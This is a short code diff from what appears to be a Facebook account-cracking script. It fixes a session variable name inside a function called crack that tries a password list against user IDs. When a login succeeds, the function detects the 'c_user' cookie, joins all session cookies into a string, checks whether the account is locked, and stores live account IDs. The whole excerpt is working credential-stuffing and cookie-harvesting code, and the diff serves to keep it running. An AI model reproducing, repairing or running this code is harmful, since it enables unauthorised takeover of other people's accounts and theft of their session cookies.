@@ -187,11 +187,11 @@ def crack(uid, password_list, total_count):
             )
             
             # Check response
-            cook = Session.cookies.get_dict().keys()
+            cook = session.cookies.get_dict().keys()
             if "c_user" in cook:
-                cok = Session.cookies.get_dict()
+                cok = session.cookies.get_dict()
                 cid = cok["c_user"]
-                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                coki = ";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 check = check_lock(cid)
                 if "live" in check:
                     bkas.append(cid)
